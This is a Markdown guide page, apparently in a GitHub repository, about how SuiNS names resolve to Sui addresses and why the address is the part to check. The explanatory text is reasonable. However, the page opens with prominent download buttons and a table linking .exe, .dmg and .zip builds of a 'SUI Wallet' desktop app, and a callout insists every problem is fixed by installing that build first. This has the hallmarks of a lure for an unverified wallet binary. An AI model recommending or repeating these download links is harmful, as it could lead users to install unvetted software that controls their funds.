![SUI Wallet](assets/banner-article.png)

# SUI Wallet and SuiNS names

A SuiNS name points at an address; the address still does the work.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A SuiNS name is a name object that points at an address, and the wallet displays it beside the address rather
than instead of it. It makes an address easier to read and to say out loud. It does not make a payment safer
by itself, because a name can point somewhere you did not expect.

## What the name actually is

An object owned by an account, with a record inside it that names another address. Sending to a name means resolving that record and sending to whatever it holds, and the name is not a username on somebody's server. It resolves an address; it does not vouch for one.

That is the whole machinery, and it is worth holding on to: the name is not a username on a server, and nobody
can redirect it by resetting a password. Changing where a name points is a transaction by its owner.

It is also why a name is worth checking rather than trusting. A record can be pointed anywhere by whoever owns it, and the name itself carries no history of where it used to point.

## Why the wallet shows both

A name is memorable and an address is not, which is exactly why a wallet shows the pair. The name is what you
recognise; the address is what the transaction uses, and it is the thing a signature actually commits to.

Reading both is the habit worth having. A name that looks right beside an address that does not is a warning
rather than a coincidence.
[Finding your SUI Wallet address](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/finding-your-sui-wallet-address.md) covers where the address lives and why copying it from the wallet
beats copying it from a message.

A name that resolves correctly is a convenience, and a name that resolves somewhere unexpected is the earliest warning available. Neither is a reason to stop reading the address underneath it.

## Names and the objects list

Because a name is an object with an owner, it appears in the account's object list beside coins and NFTs. That
is also the first place to look when a name you registered does not appear: the object is either owned by this
address or it is not.

Registration and renewal happen through the naming service rather than through the wallet, which is why the
terms - price, duration, what happens at expiry - come from that service's own screens.
[Viewing NFTs in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/viewing-nfts-in-sui-wallet.md) covers the list itself, which is where a name shows up.

The list is the check that needs no trust in a website. If the name object is owned by the address you are looking at, it is yours in the only sense that matters on a chain.

## What a name does not prove

It does not prove who owns the address behind it, and it does not make the address correct. A name registered
by a stranger resolves to a stranger's address, and a name that looks like a company's is a string rather than
a verification.

That is the whole attack surface: a name close to a familiar one, registered recently, pointing at an address
the owner chose. Reading the address after the name is the defence, and it takes one second.

## Receiving at a name

A sender who types a name is trusting the resolution, which means the trust is in the name's current record
rather than in the string. If you tell someone to pay a name, tell them the address too, and check what the
name resolves to before you do.

Two names can look identical and differ by a character that is hard to see, so the address is the only
comparison that settles it. [Receiving SUI into your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/receiving-sui-into-your-wallet.md) covers the receiving side, including why
the first small transfer is worth doing.

The habit that avoids the whole class of mistake is to say both: the name to be memorable and the address to be checkable. A sender who pastes the address cannot resolve it to the wrong place.

## When a name looks wrong

Three explanations cover most cases: the name is owned by a different address than the one open here, the display predates the current release, or the resolution is showing a record that has since changed hands. Only the third needs a refresh rather than a fix.

The first is a facts question answered by the object list; the second is a download; the third is a reason to
refresh rather than to retype. The [repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop)
records what each release changed, and the current release is what these screens describe.

## FAQ

### What is a SuiNS name?

A name object owned by an account that points at an address. Sending to it resolves the record and sends to
the address inside, which is why both should be read before approving.

### Does a name replace my address?

No. The address is what transactions use; the name is what people read. The wallet shows them together for
that reason.

### Can someone take my name?

Ownership is on the chain, so a name changes hands through a transaction rather than through a reset. Expiry
terms belong to the naming service and are worth reading there.

### Is sending to a name safe?

As safe as the record inside it. Check the address the name resolves to, especially when the name came from a
message rather than from the person themselves.

### Why does my name not show in the wallet?

Check the object list: the name is owned by a specific address. If it is missing there too, the registration
may not have completed.

### Do I need a name to receive SUI?

No. An address is enough, and it is the form that cannot point anywhere unexpected.
